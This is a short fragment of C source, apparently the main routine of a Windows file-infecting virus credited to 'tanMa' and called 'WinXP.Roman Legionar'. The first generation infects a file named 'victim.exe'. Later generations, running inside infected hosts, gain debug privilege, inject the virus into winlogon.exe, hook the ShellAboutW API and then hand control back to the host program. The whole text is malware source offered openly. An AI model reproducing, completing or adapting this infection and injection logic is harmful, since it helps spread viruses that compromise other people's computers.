	if (dwGeneration==1)
	{
		aMessageBoxA(NULL,"Hello World!!! This is first generation!!!","[WinXP.Roman Legionar 32-bit] by tanMa",MB_OK | MB_ICONINFORMATION);

		if (!InfectFile("victim.exe"))
		{
			DBGERR("Infect File FAILED!!!")
		}


	}
	else	//Generation 2,3,4,5.....(means we are in infected victim)
	{

		//set debug previlege because we need them for accessing winlogon.exe
		SetDebugPrivilege();

		//Inject virii
		if (NULL==InsertVirusIntoProcess("winlogon.exe",(DWORD)&Intruder,0))
		{
			DBGERR("InsertVirusIntoProcess - FAILED!!!")
		}

		//say hello...
		//aMessageBoxA(NULL,"Hello World from infected Victim!!!\nPress OK to continue...","[WinXP.Roman Legionar 32-bit] by tanMa",MB_OK | MB_ICONINFORMATION);

		//hook api
		HookAPI((HMODULE)aGetModuleHandleA(NULL),"ShellAboutW",(FARPROC)&NewShellAboutW);

		//execute host
		HostEP();
	}
return;
}